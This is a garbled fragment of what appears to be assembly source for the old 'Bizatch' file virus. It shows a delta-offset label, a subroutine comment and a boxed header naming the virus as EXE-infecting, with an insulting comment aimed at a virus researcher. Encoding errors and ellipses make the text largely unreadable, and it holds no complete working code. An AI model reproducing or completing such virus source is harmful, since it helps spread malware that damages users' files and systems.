...
delta_offset:   pop     bp                         ; Get �-offset
...
; �Ĵ Subroutines... or... oh, well, subroutine :) �����������������������
...
;
;             ��[�]����������� File virus ���������������ͻ
;             �    Name: Bizatch_:P        Type  [ ] COM  �
;             � Comment: Fuck you, Bontchy       [X] EXE  �
;             �                                  [ ] SYS  �
;             �  Area 1  Header                  [ ] WIN  �
;             �  Offset  0000                             �
;             �  Length  00           Method  Delete      �
;             �  Area 2  Page_C         Area  Header      �
;             �  Offset  0000           From  +0000       �
;             �  Length  0a           Length  +0000       �
;             �                           To  +0000       �
;           > �   Link �                      +0000       �
;             �   ������                 Cut  0000        �
;           > �    Sum � 00000000                         �
